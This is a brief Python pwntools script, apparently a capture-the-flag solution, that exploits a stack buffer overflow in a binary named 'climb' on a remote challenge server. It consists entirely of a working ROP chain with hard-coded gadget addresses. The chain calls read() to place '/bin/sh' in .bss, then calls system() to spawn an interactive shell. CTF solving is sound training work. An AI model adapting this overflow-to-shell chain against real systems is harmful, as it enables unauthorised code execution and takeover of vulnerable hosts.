from pwn import *
#context.update(arch='amd64', os = 'linux', log_level = 'debug')


p = remote('cha.hackpack.club', 41702)
#p = process('climb')



p.recvrepeat(1)


addr_read = 0x400550
addr_ret = 0x00000000004004fe
addr_bss = 0x601050

addr_system = 0x400530
addr_main = 0x40067F
addr_pRDIret = 0x400743
addr_pRSI_Dret = 0x0000000000400741
addr_pRDXret = 0x0000000000400654

#call read
payload = 'a'*0x28 + p64(addr_pRDIret) + p64(0) + p64(addr_pRSI_Dret) + p64(addr_bss) + 'a'*8 + p64(addr_pRDXret) + p64(len('/bin/sh;')) + p64(addr_read)+ p64(addr_ret)

#call system
payload += p64(addr_pRDIret) + p64(addr_bss) + p64(addr_system)

p.send(payload)

p.send('/bin/sh\0')

p.interactive()

